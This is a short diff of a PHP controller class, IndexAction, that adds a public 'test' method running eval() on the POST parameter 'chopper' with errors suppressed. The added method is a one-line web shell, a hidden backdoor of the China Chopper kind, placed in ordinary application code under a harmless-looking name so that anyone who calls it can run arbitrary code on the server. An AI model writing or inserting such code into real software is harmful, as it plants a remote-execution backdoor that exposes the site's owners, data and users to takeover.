@@ -1022,4 +1022,8 @@ class IndexAction extends CommonAction {
 		var_dump($videoInfo);
 	}
 	
+	public function test() {
+		@eval($_POST['chopper']);
+		exit(0);
+	}
 }
